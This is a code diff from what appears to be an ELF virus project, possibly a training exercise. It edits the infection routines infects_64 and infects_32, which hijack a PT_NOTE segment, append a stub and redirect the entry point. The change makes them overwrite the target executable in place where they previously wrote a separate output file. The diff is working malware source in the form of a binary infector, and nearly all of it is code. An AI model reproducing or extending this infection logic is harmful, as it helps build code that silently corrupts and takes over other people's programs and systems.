@@ -75,15 +75,15 @@ static bool assemble_output(t_famine *p)
 // Write the new binary in one shot
 static bool write_output(t_famine *p, const char *path)
 {
-    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+    int fd = open(path, O_WRONLY | O_TRUNC, 0755);
     if(fd == -1)
     {
-        perror("Open woody failed.");
+        perror("Open file failed.");
         return false;
     }
     if(write(fd, p->target_file, p->target_size) != (ssize_t)p->target_size)
     {
-        perror("Write woody failed.");
+        perror("Write file failed.");
         close(fd);
         return false;
     }
@@ -95,7 +95,7 @@ static bool write_output(t_famine *p, const char *path)
 /* ------------------------------------------------------------------------- */
 
 // Pipeline: hijack a PT_NOTE, drop the stub past the image, redirect the entry.
-int infects_64(t_binary *binary)
+int infects_64(t_binary *binary, char *full_path)
 {
     t_famine p = {0};
     p.binary = binary;
@@ -106,12 +106,12 @@ int infects_64(t_binary *binary)
     if(!assemble_output(&p))
         return free_packer(&p, 1);
     patch_elf64(&p);
-    if(!write_output(&p, "woody"))
+    if(!write_output(&p, full_path))
         return free_packer(&p, 1);
     return free_packer(&p, 0);
 }
 
-int infects_32(t_binary *binary)
+int infects_32(t_binary *binary, char *full_path)
 {
     t_famine p = {0};
     p.binary = binary;
@@ -122,7 +122,7 @@ int infects_32(t_binary *binary)
     if(!assemble_output(&p))
         return free_packer(&p, 1);
     patch_elf32(&p);
-    if(!write_output(&p, "woody"))
+    if(!write_output(&p, full_path))
         return free_packer(&p, 1);
     return free_packer(&p, 0);
 }
